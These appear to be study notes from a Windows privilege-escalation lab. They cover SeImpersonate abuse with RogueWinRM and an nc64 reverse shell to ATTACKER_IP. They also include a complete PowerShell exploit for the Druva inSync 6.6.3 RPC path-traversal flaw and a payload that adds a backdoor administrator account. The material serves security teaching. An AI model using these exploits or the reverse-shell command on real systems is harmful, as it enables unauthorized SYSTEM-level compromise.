In Windows systems, you will find that the LOCAL SERVICE and NETWORK SERVICE ACCOUNTS already have such privileges. Since these accounts are used to spawn services using restricted accounts, it makes sense to allow them to impersonate connecting users if the service needs. Internet Information Services (IIS) will also create a similar default account called "iis apppool\defaultapppool" for web applications.

To elevate privileges using such accounts, an attacker needs the following: 
1. To spawn a process so that users can connect and authenticate to it for impersonation to occur. 
2. Find a way to force privileged users to connect and authenticate to the spawned malicious process.

We will use RogueWinRM exploit to accomplish both conditions. Let's start by assuming we have already compromised a website running on IIS and that we have planted a web shell on the following address: `http://10.10.141.18/`

We can use the web shell to check for the assigned privileges of the compromised account and confirm we hold both privileges of interest for this task:
	![[Pasted image 20240828165736.png]]

 **What is WinRM?**
- **Windows Remote Management (WinRM)** is a Windows service that allows remote management of Windows machines using the WS-Management protocol.
- It is often used in environments where administrators need to manage multiple machines remotely, particularly through PowerShell remoting.
- By default, WinRM is not enabled on most Windows machines, but it is commonly used in enterprise environments.

**RogueWinRM Exploit Overview**
- **Abuse of WinRM**: RogueWinRM leverages the WinRM service to establish a remote connection back to the attacker's machine. This can be done by crafting a malicious PowerShell script or using tools designed to exploit WinRM.
- **Post-Exploitation Tool**: The exploit is generally used after an attacker has gained some level of access to the target system, either through phishing, exploiting vulnerabilities, or using other methods to drop malware or a reverse shell.
- **Persistent Access**: By exploiting WinRM, attackers can maintain persistent access to the compromised machine, allowing them to execute commands remotely and potentially escalate their privileges.

 **Common Techniques Using RogueWinRM**
 **Remote Code Execution (RCE)**:
    - Attackers can use WinRM to execute arbitrary commands on the target machine remotely. This is particularly dangerous if done with elevated privileges.
    
 **Reverse Shell**:
    - An attacker can use RogueWinRM to establish a reverse shell, providing continuous remote access to the target machine.

 **Credential Dumping**:
    - After gaining access, the attacker might dump credentials from the target machine, allowing them to move laterally within the network.

 **Pivoting**:
    - RogueWinRM can be used to pivot to other machines within the network, making it a powerful tool in a larger attack campaign.


To use RogueWinRM, we first need to upload the exploit to the target machine. For your convenience, this has already been done, and you can find the exploit in the `C:\tools\` folder.

The RogueWinRM exploit is possible because whenever a user (including unprivileged users) starts the BITS service in Windows, it automatically creates a connection to port 5985 using SYSTEM privileges. Port 5985 is typically used for the WinRM service, which is simply a port that exposes a Powershell console to be used remotely through the network. Think of it like SSH, but using Powershell.

If, for some reason, the WinRM service isn't running on the victim server, an attacker can start a fake WinRM service on port 5985 and catch the authentication attempt made by the BITS service when starting. If the attacker has SeImpersonate privileges, he can execute any command on behalf of the connecting user, which is SYSTEM.

Before running the exploit, we'll start a netcat listener to receive a reverse shell on our attacker's machine:
```shell-session
user@attackerpc$ nc -lvp 4442
```

And then, use our web shell to trigger the RogueWinRM exploit using the following command:
```shell-session
c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4442"
```
	![[Pasted image 20240828170322.png]]

*Note:* 
	The exploit may take up to 2 minutes to work, so your browser may appear as unresponsive for a bit. This happens if you run the exploit multiple times as it must wait for the BITS service to stop before starting it again. The BITS service will stop automatically after 2 minutes of starting.

- The `-p` parameter specifies the executable to be run by the exploit, which is `nc64.exe` in this case. 
- The `-a` parameter is used to pass arguments to the executable. Since we want nc64 to establish a reverse shell against our attacker machine, the arguments to pass to netcat will be `-e cmd.exe ATTACKER_IP 4442`.

If all was correctly set up, you should expect a shell with SYSTEM privileges:
```shell-session
user@attackerpc$ nc -lvp 4442
Listening on 0.0.0.0 4442
Connection received on 10.10.175.90 49755

```

## **Abusing vulnerable software**

### Unpatched Software
Software installed on the target system can present various privilege escalation opportunities. As with drivers, organisations and users may not update them as often as they update the operating system. You can use the `wmic` tool to list software installed on the target system and its versions. The command below will dump information it can gather on installed software (it might take around a minute to finish):
```shell-session
wmic product get name,version,vendor
```

Remember that the `wmic product` command may not return all installed programs. Depending on how some of the programs were installed, they might not get listed here. It is always worth checking desktop shortcuts, available services or generally any trace that indicates the existence of additional software that might be vulnerable.

Once we have gathered product version information, we can always search for existing exploits on the installed software online on sites like [exploit-db](https://www.exploit-db.com/), [packet storm](https://packetstormsecurity.com/) or plain old [Google](https://www.google.com/), amongst many others.
	![[Pasted image 20240828175119.png]]

#### Case Study: Druva inSync 6.6.3
The target server is running Druva inSync 6.6.3, which is vulnerable to privilege escalation as reported by [Matteo Malvica](https://www.matteomalvica.com/blog/2020/05/21/lpe-path-traversal/). The vulnerability results from a bad patch applied over another vulnerability reported initially for version 6.5.0 by [Chris Lyne](https://www.tenable.com/security/research/tra-2020-12).

The software is vulnerable because it runs an RPC (Remote Procedure Call) server on port 6064 with SYSTEM privileges, accessible from localhost only. If you aren't familiar with RPC, it is simply a mechanism that allows a given process to expose functions (called procedures in RPC lingo) over the network so that other machines can call them remotely.

In the case of Druva inSync, one of the procedures exposed (specifically procedure number 5) on port 6064 allowed anyone to request the execution of any command. Since the RPC server runs as SYSTEM, any command gets executed with SYSTEM privileges.

The original vulnerability reported on versions 6.5.0 and prior allowed any command to be run without restrictions. The original idea behind providing such functionality was to remotely execute some specific binaries provided with inSync, rather than any command. Still, no check was made to make sure of that.

A patch was issued, where they decided to check that the executed command started with the string `C:\ProgramData\Druva\inSync4\`, where the allowed binaries were supposed to be. But then, this proved insufficient since you could simply make a path traversal attack to bypass this kind of control. Suppose that you want to execute `C:\Windows\System32\cmd.exe`, which is not in the allowed path; you could simply ask the server to run `C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe` and that would bypass the check successfully.


To put together a working exploit, we need to understand how to talk to port 6064. Luckily for us, the protocol in use is straightforward, and the packets to be sent are depicted in the following diagram:
	![[Pasted image 20240828175400.png]]

The first packet is simply a hello packet that contains a fixed string. The second packet indicates that we want to execute procedure number 5, as this is the vulnerable procedure that will execute any command for us. The last two packets are used to send the length of the command and the command string to be executed, respectively.

Here is the original exploit's code:
```powershell
$ErrorActionPreference = "Stop"

$cmd = "net user pwnd /add"

$s = New-Object System.Net.Sockets.Socket(
    [System.Net.Sockets.AddressFamily]::InterNetwork,
    [System.Net.Sockets.SocketType]::Stream,
    [System.Net.Sockets.ProtocolType]::Tcp
)
$s.Connect("127.0.0.1", 6064)

$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
$length = [System.BitConverter]::GetBytes($command.Length);

$s.Send($header)
$s.Send($rpcType)
$s.Send($length)
$s.Send($command)
```

You can pop a Powershell console and paste the exploit directly to execute it. Note that the exploit's default payload, specified in the `$cmd` variable, will create a user named `pwnd` in the system, but won't assign him administrative privileges, so we will probably want to change the payload for something more useful. 
```powershell
net user pwnd SimplePass123 /add 
net localgroup administrators pwnd /add
```

This will create user `pwnd` with a password of `SimplePass123` and add it to the administrators' group. If the exploit was successful, you should be able to run the following command to verify that the user `pwnd` exists and is part of the administrators' group:
```shell-session
PS C:\> net user pwnd
User name                    pwnd
Full Name
Account active               Yes
[...]

Local Group Memberships      *Administrators       *Users
Global Group memberships     *None
```

As a last step, you can run a command prompt as administrator, When prompted for credentials, use the `pwnd` account.
